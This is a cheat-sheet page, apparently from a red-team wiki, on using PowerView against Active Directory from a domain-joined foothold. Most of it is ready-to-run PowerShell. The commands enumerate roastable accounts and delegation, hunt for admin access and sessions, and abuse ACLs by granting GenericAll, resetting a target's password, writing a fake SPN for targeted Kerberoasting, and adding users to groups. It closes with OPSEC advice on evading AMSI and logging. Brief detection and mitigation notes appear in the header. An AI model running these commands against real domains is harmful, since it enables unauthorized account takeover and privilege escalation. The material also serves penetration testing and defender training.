---
title: PowerView
category: AD / Windows tooling
order: 10
tags: [powerview, powershell, enumeration, acl, windows]
summary: >
  The classic PowerShell recon + ACL-abuse toolkit for a domain-joined foothold.
  Enumerate users/computers/ACLs, find local-admin access and sessions, and abuse
  ACL edges — all from Windows without dropping binaries.
prerequisites:
  - Code execution on a domain-joined Windows host (any domain user context)
  - PowerView.ps1 loaded (mind AMSI/logging)
tools: [PowerView (PowerSploit / dev branch)]
detection:
  - PowerShell ScriptBlock logging (4104) of PowerView cmdlets; heavy LDAP from a workstation
mitigation:
  - Constrained Language Mode; AMSI; tiered admin; least-privilege ACLs
refs:
  - { label: "PowerView (dev)", url: "https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" }
  - { label: "HarmJ0y — PowerView cheatsheet", url: "https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993" }
---

```powershell
. .\PowerView.ps1
```

## Enumerate

```powershell
Get-Domain; Get-DomainController; Get-DomainPolicy
Get-DomainUser -Identity $target_user -Properties samaccountname,description,memberof
Get-DomainUser -SPN                    # kerberoastable
Get-DomainUser -PreauthNotRequired     # AS-REP roastable
Get-DomainComputer -Unconstrained      # unconstrained delegation
Get-DomainGroupMember 'Domain Admins'
```

## Access & sessions

```powershell
Find-LocalAdminAccess                  # where am I local admin
Invoke-UserHunter                      # where are high-value users logged on
Find-DomainShare -CheckShareAccess     # readable shares
```

## ACLs

```powershell
Find-InterestingDomainAcl -ResolveGUIDs
Get-DomainObjectAcl -Identity $target_user -ResolveGUIDs |
  ? { $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner' }
```

## Abuse ACL edges

```powershell
# grant yourself GenericAll (needs WriteDacl on the target)
Add-DomainObjectAcl -TargetIdentity $target_user -PrincipalIdentity $user -Rights All
# ForceChangePassword
Set-DomainUserPassword -Identity $target_user -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
# targeted Kerberoast (write an SPN)
Set-DomainObject -Identity $target_user -Set @{serviceprincipalname='fake/svc'}
# add to a group
Add-DomainGroupMember -Identity 'Target Group' -Members $user
```

> On modern hosts PowerView trips AMSI + ScriptBlock logging. Consider the
> impacket/bloodyAD (Linux) equivalents in the ACL abuse section when OPSEC matters.
